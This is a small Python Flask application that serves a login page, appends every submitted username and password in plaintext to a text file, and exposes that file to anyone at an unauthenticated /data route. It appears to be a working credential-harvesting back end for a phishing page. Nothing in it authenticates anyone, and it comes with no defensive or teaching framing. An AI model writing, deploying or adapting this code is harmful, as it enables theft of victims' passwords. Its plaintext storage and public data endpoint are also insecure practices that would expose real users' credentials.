from flask import Flask, render_template, request

app = Flask(__name__, template_folder="template")


@app.route('/', methods=["POST", "GET"])
def loginAndSave():
    if request.method=="POST":
        userName=request.form["userName"]
        password=request.form["password"]
        f=open("data.txt","a")
        f.write(userName)
        f.write("   pass is:")
        f.write(password)
        f.write("\n")
    return render_template("login.html")

@app.route("/data")
def data():
    file_path = "/opt/render/project/src/data.txt"
    with open(file_path, "r") as f:
        content = f.read()
    return content

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

